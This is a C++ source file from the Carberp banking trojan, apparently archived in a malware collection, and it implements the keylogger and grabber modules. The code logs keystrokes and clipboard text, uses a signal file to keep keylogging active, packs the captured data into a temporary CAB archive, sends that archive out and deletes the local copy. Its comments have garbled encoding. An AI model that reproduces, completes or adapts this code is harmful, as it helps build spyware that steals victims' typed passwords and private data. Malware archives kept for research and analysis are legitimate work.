/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "KeyLogger.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "CabPacker.h"
#include "Loader.h"
#include "UniversalKeyLogger.h"
//---------------------------------------------------------------------------



//--------------------------------------------
//  GetKeyLogger ������� ���������� ���������
//  �� ���������� ��������
//--------------------------------------------
TKeyLogger* GetKeyLogger()
{
	PKeyLogger OldLogger = KeyLogger::GetKeyLogger();
	if (!OldLogger) return NULL;

	return OldLogger->NewKeylogger;
}


//****************************************************************************
//                           TKeyLogger
//****************************************************************************


TKeyLogger::TKeyLogger()
	: TEventContainer()
{
	FGrabber = NULL;
}
//----------------------------------------------------------------------------

TKeyLogger::~TKeyLogger()
{

}
//----------------------------------------------------------------------------

//-----------------------------------------
// ������� ���������� ������ ���� �
// ��������� ��������� ������
//-----------------------------------------
bool TKeyLogger::Active()
{
	return FGrabber != NULL;
}


//-----------------------------------------
// ������� ���������� ��� �� ����������
//-----------------------------------------
bool TKeyLogger::LogKeyboard(HWND Wnd, const char* Text)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------

	if (FGrabber)
		FGrabber->LogKeyboad(Wnd, Text);
	return true;
}


//-----------------------------------------
// ������� �������� ������� �� ������ ������
//-----------------------------------------
void TKeyLogger::LogClipboard(const char* Text)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------
	if (STRA::IsEmpty(Text) || !Active()) return;

	HWND Wnd = (HWND)pGetFocus();
    FGrabber->LogClipboard(Wnd, Text);
}

//-----------------------------------------
// ������� �������� ������� ����
//-----------------------------------------
bool TKeyLogger::LogMouse(HWND Wnd, int X, int Y, int Button)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------
	return true;
}

//-----------------------------------------
// ConnectGrabber - ������ ��������� ������
// � ������� ������ ��������
//-----------------------------------------
bool TKeyLogger::ConnectGrabber(TGrabber* Grabber)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------

	if (!Grabber || FGrabber == Grabber) return false;

	// �������� ����������� ������
	if (FGrabber)
	{
		if (!DisconnectGrabber(FGrabber))
			return false;
    }

	// ����������
	FGrabber = Grabber;
	Grabber->FKeyLogger = this;
	return true;
}

//-----------------------------------------
// DisconnectGrabber ������� ���������
// ������ �� ������� ������ ���������
//-----------------------------------------
bool TKeyLogger::DisconnectGrabber(TGrabber* Grabber)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------

	if (!FGrabber || FGrabber != Grabber)
		return false;
	FGrabber->FKeyLogger = NULL;
	FGrabber = NULL;
	return true;
}


//-----------------------------------------
//  CallEvent - ������� �������� �������
//-----------------------------------------
void TKeyLogger::CallEvent(int EventId, LPVOID Param)
{
	//------  ��������� ��� --------
	TLock L = GetLock();
	//------------------------------

	if (FGrabber) FGrabber->DoEvent(EventId, Param);

	inherited::CallEvent(EventId, Param);
}



//****************************************************************************
//                           TInfiniteKeyLogger
//****************************************************************************

TInfiniteKeyLogger::TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

TInfiniteKeyLogger::~TInfiniteKeyLogger()
{

}
//----------------------------------------------------------------------------

//--------------------------------------------
//  ������� ���������� ��� ����������� �����
//  � ������� ����� ��������� ���������� �
//  ������� ����������
//--------------------------------------------
string TInfiniteKeyLogger::GetSignalFileName()
{
	return BOT::MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
}


//--------------------------------------------
//  Activate - ������� ���������� ����������
//             ��������
//--------------------------------------------
bool TInfiniteKeyLogger::Activate()
{
	string FN = GetSignalFileName();
	DWORD W = File::WriteBufferA(FN.t_str(), FN.t_str(), 2);
	return W == 2;
}
//----------------------------------------------------------------------------

//--------------------------------------------
//  Activated - ������� ���������� ������ ����
//             �������� �����������
//--------------------------------------------
bool TInfiniteKeyLogger::Activated()
{
	string FN = GetSignalFileName();
	return File::IsExists(FN.t_str());
}
//----------------------------------------------------------------------------




//********************************************************
//  TGrabber - ������� ����� �������
//********************************************************
TGrabber::TGrabber(const string& GrabberName)
{
	FKeyLogger = NULL;
	FCab = NULL;
	FName = GrabberName;
}

TGrabber::~TGrabber()
{
	DisconnectFromKeyLogger();
}

//-----------------------------------------
//  ConnectToKeyLogger - ������� ����������
//  ������ � ���������, ����� ���� ����
//  ���� ����� ��������������� �������
//-----------------------------------------
bool TGrabber::ConnectToKeyLogger()
{
	if (FKeyLogger) return false;

	TKeyLogger *Logger = GetKeyLogger();
	if (Logger)
		return Logger->ConnectGrabber(this);
	else
		return false;
}


//-----------------------------------------
//  DisconnectFromKeyLogger - �������
//  ��������� ������ �� ���������
//-----------------------------------------
bool TGrabber::DisconnectFromKeyLogger()
{
	bool Result = false;
	if (FKeyLogger)
	{
		Result = FKeyLogger->DisconnectGrabber(this);
		FKeyLogger = NULL;
    }
	return Result;
}


//-----------------------------------------
// ������� ��������� ����� ����������� ��
// ������ ������
//-----------------------------------------
void TGrabber::LogClipboard(HWND Wnd, const char* Text)
{
	LogKeyboad(Wnd, Text);
}


//-----------------------------------------
//  OpenCab - ������ ��������� ��� �����
//            �� ��������� �����
//-----------------------------------------
LPVOID TGrabber::OpenCab()
{
	if (FCab) return FCab;
	FCabFileName = File::GetTempName2A();
	FCab = CreateCab(FCabFileName.t_str());
	if (!FCab)
    	FCabFileName.Clear();
	return FCab;
}

//-----------------------------------------
//  ���� ���������� ��������� ���
//-----------------------------------------
void inline _CloseCab(LPVOID Cab) { CloseCab(Cab); }

//-----------------------------------------
//  CloseCab - ������� ��������� ��������
//             ��� ����� �, ��� ��������-
//             �����, ��������� ���
//-----------------------------------------
void TGrabber::CloseCab(bool SendLog)
{
	if (!FCab) return;
	// �������� �����
	_CloseCab(FCab);

	// ���������� ���
	if (SendLog)
	{
		DataGrabber::SendCabDelayed(NULL, FCabFileName.t_str(), FName.t_str());
	}

	// ������� ��������� ����
	pDeleteFileA(FCabFileName.t_str());
	FCabFileName.Clear();
	FCab = NULL;
}
